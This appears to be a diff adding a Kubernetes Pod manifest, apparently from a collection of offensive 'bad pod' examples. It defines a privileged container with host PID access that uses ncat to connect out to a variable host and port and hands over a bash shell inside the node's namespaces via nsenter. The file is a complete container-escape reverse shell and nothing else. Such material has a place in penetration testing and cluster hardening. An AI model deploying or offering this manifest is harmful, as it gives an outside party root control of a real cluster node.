@@ -1,0 +1,14 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-priv-hostpid-revsh
+  labels:
+spec:
+  hostPID: true
+  containers:
+  - name: pod-priv-hostpid-revsh
+    image: raesene/ncat
+    tty: true
+    securityContext:
+      privileged: true
+    command: [ "ncat" ,"$HOST", "$PORT", "-e", "/usr/bin/nsenter -t 1 --mount --pid --ipc --uts --net -- bash" ] 
